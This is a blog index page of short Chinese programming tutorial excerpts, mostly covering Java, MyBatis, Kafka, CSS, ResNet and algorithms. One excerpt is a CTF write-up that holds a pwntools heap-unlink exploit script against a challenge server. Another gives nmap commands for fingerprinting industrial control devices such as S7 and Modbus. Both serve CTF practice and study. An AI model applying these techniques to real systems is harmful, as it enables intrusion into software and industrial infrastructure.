<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b88b2dbc7ee5abed420ba9b94e3284c/" rel="bookmark">
			C语言 结构体习题：通过学生学号查询学生信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Description
有5个学生，每个学生的数据包括：学号（字符数组型）、姓名（字符数组型）、C语言成绩（整型），编写程序先从键盘上输入学生们的数据，再输入一个学生的学号，要求输出该学号对应的学生信息，未找到该学生时输出not found。
Input
输入仅6行，前5行输入5个学生的学号、姓名、C语言成绩，要求数据之间用空格隔开。第6行输入一个学号信息。
Output
输出仅一行，输出学号对应的学生信息或not found (两单词中间有一空格)。
Sample Input
111 yi 89 222 er 87 333 san 98 444 si 90 555 wu 56 333 Sample Output
333 san 98 代码：
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #define N 5 struct stu { char num[20]; char name[20]; int mark; }; int main() { struct stu s[N]; char a[20]; int i; for(i=0; i&lt;N; i++) { scanf("%s",s[i].num); scanf("%s",s[i].name); scanf("%d",&amp;s[i].mark); } scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b88b2dbc7ee5abed420ba9b94e3284c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56e9eea2c080292d88381d8e4d94f16e/" rel="bookmark">
			关于新手在mybatis中的Mapped Statements collection does not contain value for报错信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人纯新手，查了几天的资料
看弹幕好多人说要注意英文单词不要写错，大多数人是不相信自己会犯这种低级错误的（比如我），结果吃了大亏。我原先把“test”写成了“tset”，但在双引号内的内容是不会报错的，于是白查了几天bug。现在还有Mapped Statements collection does not contain value for报错的，不妨先仔细检查自己的拼写吧，作为纯新手只能帮到这了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f35762d864c332ca63a1d9fec8cc7a9/" rel="bookmark">
			java代码发布shp图层到geoserver服务中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pom依赖 &lt;dependency&gt; &lt;groupId&gt;com.github.dov-vlaanderen&lt;/groupId&gt; &lt;artifactId&gt;geoserver-manager&lt;/artifactId&gt; &lt;version&gt;1.8.5&lt;/version&gt; &lt;/dependency&gt; 代码实现 public String publishGeoServerTif(String filePath) throws Exception { // 如果不存在工作区则创建 URL u = new URL(geoserverUrl.getUrl()); GeoServerRESTManager manager = new GeoServerRESTManager(u, geoserverUrl.getUserName(), geoserverUrl.getPassword()); GeoServerRESTPublisher publisher = manager.getPublisher(); GeoServerRESTReader reader = manager.getReader(); List&lt;String&gt; workspaces = manager.getReader().getWorkspaceNames(); if (!workspaces.contains(geoserverUrl.getWorkSpace())) { publisher.createWorkspace(geoserverUrl.getWorkSpace()); } File file = new File(filePath); String fileName = file.getName().replace(".shp", ""); String zipFile = filePath.replace(".shp", ".zip"); //判断数据存储（datastore）是否已经存在，不存在则创建 RESTDataStore restStore = manager.getReader().getDatastore(geoserverUrl.getWorkSpace(), fileName); if (restStore == null) { //创建shape文件存储 URL url = new URL("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f35762d864c332ca63a1d9fec8cc7a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b22252f3b2f84ab1189cc163b0758804/" rel="bookmark">
			java通过gdal把单波段tiff文件转换为shp矢量文件并压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import cn.hutool.core.util.ZipUtil; import org.gdal.gdal.Band; import org.gdal.gdal.Dataset; import org.gdal.gdal.Driver; import org.gdal.gdal.gdal; import org.gdal.gdalconst.gdalconst; import org.gdal.gdalconst.gdalconstConstants; import org.gdal.ogr.Feature; import org.gdal.ogr.FieldDefn; import org.gdal.ogr.Layer; import org.gdal.ogr.ogr; import org.gdal.osr.SpatialReference; import java.io.File; /** * tiff文件转矢量文件 * @return 默认返回shp矢量文件 隐藏的会生成shp文件同名的zip压缩文件 */ public static String tiffConvertShp(String inRaster) { String outShp = inRaster.replace(".tif",".shp"); //载入栅格，读取相关信息 Dataset dataset = gdal.Open(inRaster, gdalconstConstants.GA_ReadOnly); Band band = dataset.GetRasterBand(1);//栅格转矢量需要的波段信息 SpatialReference prj = new SpatialReference(); if (!dataset.GetProjectionRef().isEmpty()) { prj.ImportFromWkt(dataset.GetProjectionRef());//栅格数据的坐标系作为矢量化后的坐标系 } //创建输出矢量 String fileName = outShp.substring(outShp.lastIndexOf("\\") + 1);//带后缀的文件名 String name = fileName.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b22252f3b2f84ab1189cc163b0758804/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce122c5a1f4e506a3ffe2153e1650b16/" rel="bookmark">
			ctfshow-36D杯-pwn(1024_happy_unlink )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一道很简单的unlink堆题目话不多说先上exp：
from pwn import * context.log_level = 'debug' r = remote('pwn.challenge.ctf.show',28109) libc = ELF("./libc.so-1.6") def add(idx,size): r.recvuntil('choice') r.sendline('1') r.recvuntil('idx:') r.sendline(str(idx)) r.recvuntil('size') r.sendline(str(size)) def delete(idx): r.recvuntil('choice') r.sendline('2') r.recvuntil('idx:') r.sendline(str(idx)) def show(idx): r.recvuntil('choice') r.sendline('3') r.recvuntil('idx:') r.sendline(str(idx)) def edit(idx,content): r.recvuntil('choice') r.sendline('4') r.recvuntil('idx:') r.sendline(str(idx)) r.recvuntil('content') r.sendline(content) add(0,0x20) add(1,0x38) add(2,0x80) add(4,0x20) target = 0x6020e0+0x10#存放堆块索引的地址 fd = target - 0x18 bk = target - 0x10 payload = p64(0)+p64(0x30)+p64(fd)+p64(bk)+b"a"*0x10+p64(0x30)+p64(0x90) edit(1,payload) delete(2) payload = b'a'*8+p64(0x602058)+p64(8)+p64(0x602058)+p64(8) #setvbuf edit(1,payload) show(1) r.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce122c5a1f4e506a3ffe2153e1650b16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a49b6d7854b0b1e6ffdb934a93382856/" rel="bookmark">
			[Clickhouse 入门到精通]-单机安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Clickhouse官网：ClickHouse - Fast Open-Source OLAP DBMS
Clickhouse中文官网：什么是ClickHouse？ | ClickHouse Docs
1、安装 curl 工具 [root@master package]# yum install -y curl 已加载插件：fastestmirror, langpacks Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * extras: mirrors.huaweicloud.com * updates: mirrors.aliyun.com base | 3.6 kB 00:00:00 extras | 2.9 kB 00:00:00 updates | 2.9 kB 00:00:00 updates/7/x86_64/primary_db | 4.7 MB 00:00:05 正在解决依赖关系 --&gt; 正在检查事务 ---&gt; 软件包 curl.x86_64.0.7.29.0-59.el7 将被 升级 ---&gt; 软件包 curl.x86_64.0.7.29.0-59.el7_9.1 将被 更新 --&gt; 正在处理依赖关系 libcurl = 7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a49b6d7854b0b1e6ffdb934a93382856/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfd26380bdaecdbfd270dbe60952468d/" rel="bookmark">
			ResNet网络解析及实战案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络越深，获取的信息就越多，特征也越丰富。但是在实践中，随着网络的加深，优化效果反而越差，测试数据和训练数据的准确率反而降低了。如下图所示，56层和20层的神经网络对训练误差和测试误差的对比
针对这种深层网络退化的问题，何恺明等人提出了残差网络（ResNet）在2015年的ImageNet图像识别挑战赛夺魁，并深刻影响了后来的深度神经网络的设计。
1 残差块 假设 F(x) 代表某个只包含有两层的映射函数， x 是输入， F(x)是输出。假设他们具有相同的维度。在训练的过程中我们希望能够通过修改网络中的 w和b去拟合一个理想的 H(x)(从输入到输出的一个理想的映射函数)。也就是我们的目标是修改预测值F(x) 中的 w和b以便逼近真实值 H(x) 。如果我们改变思路，用F(x) 来逼近 H(x)-x ，那么我们最终得到的输出就变为 F(x)+x（这里的加指的是对应位置上的元素相加，也就是element-wise addition），这里将直接从输入连接到输出的结构也称为shortcut，那整个结构就是残差块，ResNet的基础模块。
假设网络结构如下图所示，在19层中加上一个短连接，绕过20层和21层，在网络的训练过程中，假如第20，21层的效果不好，那么它们对应的权重参数会在迭代训练中不断变小，甚至直接置零，也就是此时网络已经放弃了第20，21层，直接通过短连接绕过它们；假如第20，21层的效果表现很好，那么那么它们对应的权重参数会在迭代训练中不断增大，也就是说让网络自己来选择是重视第20，21层还是放弃这两层。所以何凯明曾经说过：“ResNet能达到什么效果呢，多高我不敢说，但是至少不比原来差“。在实际场景中，这种残差块通常会做很多个，即便是有其中几层表现效果很差也没有关系，只要有其中一层表现好就可以提升原来的性能。
残差结构由主分支和捷径分支(也称为短连接)组成，它有两种形式：分别是基础模块(BasicBlock)和瓶颈模块(Bottleneck)，分别对应下图中的左半部分和右半部分。
这两种结构分别用于ResNet18/34（左图）和ResNet50/101/152（右图），其中右图中的瓶颈模块，目的就是为了降低参数量。
在瓶颈模块中，第一个1x1卷积下降了1/4通道数，第二个1x1卷积提升了4倍通道数，在pytorch官方代码实现中，设置超参数expansion=4来实现这一功能
resnet在pytorch 官网的实现位置是：anaconda\envs\Lib\site-packages\torchvision\models\resnet.py
瓶颈模块将两个3x3的卷积层替换为1x1 + 3x3 + 1x1，新结构中的中间3x3的卷积层首先在一个降维1x1卷积层下减少了计算，然后在另一个1x1的卷积层下做了还原。第一个1x1的卷积把256维通道降到64维，然后在最后通过1x1卷积恢复，整体上用的参数数目：1x1x256x64 + 3x3x64x64 + 1x1x64x256 = 69632，而不使用bottleneck的话，就是两个3x3x256的卷积，如下图所示，此时的参数数目: 3x3x256x256x2 = 1179648，是前者的16.94倍。
2 不同层的网络 常见的resnet结构主要有resnet18，34，50，101和152，下表给出了它们具体的结构：
首先看表的最左侧，所有的网络都分成5部分，分别是：conv1，conv2_x，conv3_x，conv4_x，conv5_x， 例如：101-layer指的是101层网络，首先有个输入7x7x64的卷积，然后经过3 + 4 + 23 + 3 = 33个残差块，每个残差块为3层，所以有33 x 3 = 99层，最后有个全连接层(用于分类)，所以1 + 99 + 1 = 101层，一共是101层网络； 我们看下50-layer和101-layer这两列，可以发现，它们唯一的不同在于conv4_x，ResNet50有6个block，而ResNet101有23个block，两者之间差了17个block，也就是17 x 3 = 51层。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfd26380bdaecdbfd270dbe60952468d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07950d1b96cdb129bcb3b9b6bab7ad0f/" rel="bookmark">
			kafka消费者API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		kafka的消费方式 pull（拉模式） 消费者采用从broker中主动拉去数据 kafka采用这种方式
push（推模式） kafka没有采用这种方式，因为由broker决定消费发送速率。很难适应所有消费者
pull模式不足之处是，如果kafka没有数据。消费者还是会进行监听操作。
两者区别 由 broker 决定消息推送的速率，对于不同消费速率的 consumer 就不太好处理 了。消息系统都致力于让 consumer 以最大的速率最快速的消费消息，但不幸的是， push 模式下， 当broker 推送的速率远大于 consumer 消费的速率时，consumer 恐怕就要崩溃了 。最终 Kafka 还是选取了传统的 pull 模式。
Pull 模式的另外一个好处是 consumer 可以自主决定是否批量的从 broker 拉取数据 。 Push 模式必须在不知道下游 consumer 消费能力和消费策略的情况下决定是立即推送每条消息还是缓存之后批量推 送。如果为了避免 consumer 崩溃而采用较低的推送速率，将可能导致一次只推送较少的消息而造成浪 费。 Pull 模式下， consumer 就可以根据自己的消费能力去决定这些策略。
Pull 有个缺点 是， 如果 broker 没有可供消费的消息，将导致 consumer 不断在循环中轮询，直到新消息到达 。为了避免这点， Kafka 有个参数可以让 consumer 阻塞知道新消息到达 ( 当然也可以阻塞知道 消息的数量达到某个特定的量这样就可以批量发送 )
消费者工作流程 生产者生产消息到kafka集群中。集群将产生的消息放入不同的kafka的broker 每一个broker表示一个kafka节点 对应的分区中kafka的分区存在副本，leader和follower，进行消息的安全性（丢失，重复，顺序）每一个消费者都属于一个消费者组。即使只有一个消费者。默认也是存在一个消费者组消费者组绑定一个Topic主题。Topic下的存在多个分区。每一个分区的数据只能给一个消费者消费。因为如果一个分区数据同时给同一个消费者组的两个消费者消费会造成数据的重复一个消费者可以同时消费多个Topic中的多个分区数据。一个topic中的数据可以给多个消费者或消费者组消费。对相同的数据存在不同的业务操作 分区的分配规则 代码展示消费者组下的消费者消费情况
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07950d1b96cdb129bcb3b9b6bab7ad0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9ae98f1482f525dac0953de8e18b896/" rel="bookmark">
			mybatis中if标签test 判断等于
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.判断不等于空
&lt;if test="map.user_id != null and map.user_id != ''"&gt;
2.判断等于字符串
&lt;if test='map.infodata == "1"'&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be0d8ea945336dcf9e9fc141377c22bf/" rel="bookmark">
			详细梳理ajax跨域4种解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 自动接触前端，跨域这个词就一直萦绕在耳畔。因为一般接手的项目都已经做好了这方面的处理，而且之前一直感觉对这方面模棱两可，所以今天就抽个时间梳理一下。
为什么需要跨域 跨域这个概念来自一个叫 “同源策略” 的东西。同源策略是浏览器（注意是浏览器，跟通信协议无关）上为了安全考虑实施的非常重要的安全机制。
Ajax 默认只能获取到同源的数据，对于非同源的数据，Ajax是获取不到的。
什么是同源？ 协议相同域名相同端口相同 举例来说，http://www.example.com/dir/page.html这个网址，协议是http://，域名是www.example.com，端口是80（默认端口可以省略）。这个网址，在这个地址中要去访问下面服务器的数据，那么会发生什么情况呢？
URL结果原因https://www.example.com/dir/other.html不同源协议不同，https 和 httphttp://en.example.com/dir/other.html不同源域名不同http://www.example.com:81/dir/other.html不同源端口不同http://www.example.com/dir/page2.html同源协议，域名，端口都相同http://www.example.com/dir2/page.html同源协议，域名，端口都相同 那么。想要获取非同源地址的数据，就要使用跨域。不论是 Ajax 还是跨域，都是为了访问服务器的数据。简单的来说， Ajax 是为了访问自己服务器的数据，跨域是为了访问别人服务器的数据（比如获取天气信息，航班信息等）。
同源策略的目的 为了保证用户信息的安全，防止恶意的网站窃取数据。
“ 设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？
很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。
由此可见，"同源政策"是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。”
via@ 阮一峰
实现跨域的方式 反向代理JSONPWebSocketCORS（根本解决方案） 反向代理 反向代理就是使用自己的服务器，在后端请求目标服务器的数据，然后返回给客户端。相当于做了一把中间人的感觉。
反向代理服务器，最常用的就是Nginx。但是作为前端代码实现的Node.js也可以搭建反向代理服务器。
下面来简要介绍使用node服务进行反向代理。
要实现这个前提是，前端开发环境必须运行在nodejs服务中，所幸的是，现在前端的开发自动化工具都是建立在nodejs上的，所以这个前提也不是很重要。
比如我有一个后端接口：http://39.105.136.190:3000/zhuiszhu/goods/getList，可以获取一些商品列表数据，但是我运行的node项目是在 localhost:3000 下的，明显构成跨域。
我们根据项目使用的框架不同，处理的方式也不同。
1、nodejs+express+http-proxy-middleware 插件代理
如果是express项目，可以使用http-proxy-middleware 来处理，这个插件主要用于将前端请求代理到其它服务器。
用法很简单。你可以参考插件github官网： https://github.com/chimurai/http-proxy-middleware
首先需要在你的express项目中安装该插件：
npm install --save-dev http-proxy-middleware 然后在 app.js 中进行代理设置（示例如下）：
var express = require('express');var proxy = require('http-proxy-middleware');var app = express();app.use('/zhuiszhu', proxy({target: 'http://39.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be0d8ea945336dcf9e9fc141377c22bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9a98d242f183018f3c2dbaa6615a4b2/" rel="bookmark">
			工控安全—工控常见协议识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Nmap常见参数介绍二、工控常见协议识别三、工控设备指纹识别3.1 S73.2 Modbus3.3 IEC 60870-5-1043.4 DNP33.5 EtherNet/IP3.6 BACnet3.7 Tridium Niagara Fox3.8 Crimson V33.9 OMRON FINS3.10 PCWorx3.11 ProConOs3.12 MELSEC-Q 四、测试 一、Nmap常见参数介绍 -sT	表示TCP全连接扫描 -sS	表示TCP半开扫描,该选项扫描的最大好处是，扫描动作极少会被记录，更具有隐蔽性！ -sP Ping扫描 快速发现网络，扫描网段 -Pn	非ping扫描，不执行主机发现，可以跳过防火墙 （ 常用） -sV	探测打开端口对应服务的版本信息 -O 操作系统检测 -iL [ip地址列表文件] 扫描一个目标列表 -oX xml 将结果以xml格式输出 -n 不反向解析IP地址到域名 -sU UDP扫描 二、工控常见协议识别 https://github.com/hi-KK/ICS-Protocol-identify
三、工控设备指纹识别 3.1 S7 nmap -sS -Pn -p 102 --script s7-info -iL 123.txt -oX 123.xml 3.2 Modbus nmap -sS -Pn -p 502 --script modicon-info -iL 123.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9a98d242f183018f3c2dbaa6615a4b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e8472b4e7601f9816db8574b2442441/" rel="bookmark">
			css之display:inline-block布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		css之display:inline-block布局
1.解释一下display的几个常用的属性值，inline ， block， inline-block
inline（行内元素）:
使元素变成行内元素，拥有行内元素的特性，即可以与其他行内元素共享一行，不会独占一行.
不能更改元素的height，width的值，大小由内容撑开.
可以使用padding上下左右都有效，margin只有left和right产生边距效果，但是top和bottom就不行.
block（块级元素）:
使元素变成块级元素，独占一行，在不设置自己的宽度的情况下，块级元素会默认填满父级元素的宽度.
能够改变元素的height，width的值.
可以设置padding，margin的各个属性值，top，left，bottom，right都能够产生边距效果.
inline-block（融合行内于块级）:
结合了inline与block的一些特点，结合了上述inline的第1个特点和block的第2,3个特点.
用通俗的话讲，就是不独占一行的块级元素。如图:
图一:
图二：
两个图可以看出，display：inline-block后块级元素能够在同一行显示，有人这说不就像浮动一样吗。没错，display：inline-block的效果几乎和浮动一样，但也有不同，接下来讲一下inline-block和浮动的比较。
2.inline-block布局 vs 浮动布局
a.不同之处：对元素设置display：inline-block ，元素不会脱离文本流，而float就会使得元素脱离文本流，且还有父元素高度坍塌的效果 b.相同之处：能在某程度上达到一样的效果 我们先来看看这两种布局：
图一：display：inline-block
图二：对两个孩子使用float：left，我在上一篇浮动布局讲过，这是父元素会高度坍塌，所以要闭合浮动，对box使用overflow：hidden，效果如下：
乍一看两个都能做到几乎相同的效果，（仔细看看display：inline-block中有间隙问题，这个留到下面再讲）
c.浮动布局不太好的地方：参差不齐的现象，我们看一个效果：
图三：
图四：
从图3,4可以看出浮动的局限性在于，若要元素排满一行，换行后还要整齐排列，就要子元素的高度一致才行，不然就会出现图三的效果，而inline-block就不会。
3.inline-block存在的小问题：
a.上面可以看到用了display:inline-block后，存在间隙问题，间隙为4像素，这个问题产生的原因是换行引起的，因为我们写标签时通常会在标签结束符后顺手打个回车，而回车会产生回车符，回车符相当于空白符，通常情况下，多个连续的空白符会合并成一个空白符，而产生“空白间隙”的真正原因就是这个让我们并不怎么注意的空白符。
b.去除空隙的方法：
1.对父元素添加，{font-size:0}，即将字体大小设为0，那么那个空白符也变成0px，从而消除空隙
现在这种方法已经可以兼容各种浏览器，以前chrome浏览器是不兼容的
图一：
c.浏览器兼容性：ie6/7是不兼容 display：inline-block的所以要额外处理一下：
在ie6/7下：
对于行内元素直接使用{dislplay:inline-block;}
对于块级元素：需添加{display:inline;zoom:1;}
4.总结:
display：inline-block的布局方式和浮动的布局方式，究竟使用哪个，我觉得应该根据实际情况来决定的：
a.对于横向排列东西来说，我更倾向与使用inline-block来布局，因为这样清晰，也不用再像浮动那样清除浮动，害怕布局混乱等等。
b.对于浮动布局就用于需要文字环绕的时候，毕竟这才是浮动真正的用武之地，水平排列的是就交给inline-block了。
如需转载请标明出处，本文地址：http://www.cnblogs.com/Ry-yuan/p/6848197.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ebd9af0d32871bc53ea57fc67e9bba45/" rel="bookmark">
			使用指定内存启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nohup java -jar -Xms512m -Xmx1G -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:G1NewSizePercent=20 -XX:G1MaxNewSizePercent=30 -XX:+DisableExplicitGC -XX:+PrintGC -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=oom-error_gateway.log -Xloggc:gc_log_gateway.log yly-gateway-0.0.4-SNAPSHOT.jar &amp;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8bbdf14af71472c96def96d9b5221e4/" rel="bookmark">
			如何重新启动k8s集群,并查看的状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		重新启动k8s集群的方法取决于您使用的部署方式。
如果您使用的是kubeadm部署，可以使用以下命令重启集群:
kubeadm reset kubeadminit 如果您使用的是其他部署工具，请按照该工具的说明操作。
查看集群状态可以使用kubectl命令，如:
kubectlget nodes 该命令会列出集群中所有节点的状态。
kubectlget pods --all-namespaces 该命令会列出集群中所有命名空间中的pod状态
kubectlget pods -n kube-system 该命令会列出集群中kube-system命名空间中的pod状态
kubectlget pods --watch 该命令会持续监视集群中pod状态的变化。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88a4bb4e03efc071ff3a80c209a27808/" rel="bookmark">
			【性能优化】Mybatis Plus：优化查询速度 - SQL替换Service
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优化查询速度 - SQL替换Service Service 接口问题 下面是原先的 Service 实现类代码，有门店 ID、订单状态、查询时间段，然后查出了所有的结果，继续使用 java8 的特性获取汇总结果，随着项目的推移，数据量越来越大，这种方式是不可取的，随便都能上几十秒查不出来，导致请求超时，下面我们就来优化一下这个方法
SQL 优化 先把上面的方法都转换成 SQL 语句的写法，得到下面的 5 个查询 SQL
select sum(A.pay_money) originPrice, count(A.id) countOrder, sum(A.pay_money) payMoney from biz_order_info A where A.`status` = 1 and A.order_status = 2 and A.store_id = 1; select sum(A.pay_money) smPayMoney from biz_order_info A where A.`status` = 1 and A.order_status = 2 and A.store_id = 1 and A.pay_way = 1; select sum(A.pay_money) rlPayMoney from biz_order_info A where A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88a4bb4e03efc071ff3a80c209a27808/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30217cef2682e9d1638302b75f984ea7/" rel="bookmark">
			【算法】广度优先遍历 (BFS)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.概述2.代码实现3.应用 1.概述 （1）广度优先遍历 (Breadth First Search)，又称宽度优先遍历，是最简便的图的搜索算法之一。
（2）已知图 G = (V, E) 和一个源顶点 start，宽度优先搜索以一种系统的方式探寻 G 的边，从而“发现” start 所能到达的所有顶点，并计算 start 到所有这些顶点的距离（最少边数），该算法同时能生成一棵根为 start 且包括所有可达顶点的广度优先树。对从 start 可达的任意顶点 v，广度优先树中从 start 到 v 的路径对应于图 G 中从 start 到 v 的最短路径，即包含最小边数的路径。该算法对有向图和无向图同样适用。
（3）之所以称之为广度优先遍历，是因为算法自始至终一直通过已找到和未找到顶点之间的边界向外扩展，就是说，算法首先搜索和 start 距离为 k 的所有顶点，然后再去搜索和 start 距离为 k + 1 的其他顶点。
2.代码实现 （1）当使用邻接矩阵来表示图时，其代码实现如下：
class Solution { /* adjMatrix 为邻接矩阵，adjMatrix[i][j] = 0 表示节点 i 和 j 之间没有边直接相连 start 为遍历的起点 */ public void bfs(int[][] adjMatrix, int start) { // n 表示图中的节点数量，节点编号为 0 ~ n - 1 int n = adjMatrix.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30217cef2682e9d1638302b75f984ea7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5a4c5ae8647f64fc88a364cde1ed7e9/" rel="bookmark">
			Python的23种设计模式(完整版带源码实例)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：虚坏叔叔
博客：https://xuhss.com
早餐店不会开到晚上，想吃的人早就来了！😄
Python的23种设计模式 一 什么是设计模式 设计模式是面对各种问题进行提炼和抽象而形成的解决方案。这些设计方案是前人不断试验，考虑了封装性、复用性、效率、可修改、可移植等各种因素的高度总结。它不限于一种特定的语言，它是一种解决问题的思想和方法
二 为什么要有设计模式 公司人事会有变动，程序员也会成长。不管是哪种情况，代码非常有可能会被移交，即代码的编写者和维护者很有可能会是不同的人。那么代码的可读性就显得非常重要了。由于高级语言的出现，让机器读懂你的意图已经不是最主要的“矛盾”，而让人读懂你的意图才是最重要。按照设计模式编写的代码，其可读性也会大大提升，利于团队项目的继承和扩展
三 有那些设计模式 设计模式可以分为三个大类： 创建类设计模式、结构类设计模式、行为类设计模式
创建类设计模式（5种） 单例模式、工厂模式（简单工厂模式、抽象工厂模式）、建造者模式、原型模式
结构类设计模式（7种） 代理模式、装饰器模式、适配器模式、门面模式、组合模式、享元模式、桥梁模式
行为类设计模式（11种） 策略模式、责任链模式、命令模式、中介者模式、模板模式、迭代器模式、访问者模式、观察者模式、解释器模式、备忘录模式、状态模式
设计模式也衍生出了很多的新的种类，不局限于这23种
四 设计模式与架构，框架的关系 1 软件框架与设计模式的关系 软件框架随着软件工程的发展而出现，所谓的软件框架，是提取了特定领域的软件的共性部分所形成的软件体系，它并不是一个成熟的软件，而更像是一个“半成品”，程序员在框架之上，可以很方便地某些特定领域实现又快又可靠的二次开发。
设计模式 和 软件框架 在软件设计中是两个 不同 的研究领域：
A、设计模式如前边的定义所讲，它指的是针对一类问题的解决方法，一个设计模式可应用于不同的框架和被不同的语言所实现；而框架则是一个应用的体系结构，是一种或多种设计模式和代码的混合体；
B、设计模式相较于框架更容易移植，并且可以用各种语言实现，而软件框架则受限于领域大环境。虽然设计模式和软件框架有很多不同，但在某些方面他们二者是统一的，即重视软件复用，提高开发效率。
2 软件架构与设计模式的关系 软件架构是个比较大的概念，架构要考虑软件的整体结构、层次划分以及不同部分间的协作和交互等，架构的着眼点偏整体。
相比之下，框架和设计模式的范围则具体很多，框架着眼于领域内的解决方法，而设计模式则针对一类问题的解决方案和设计思路。
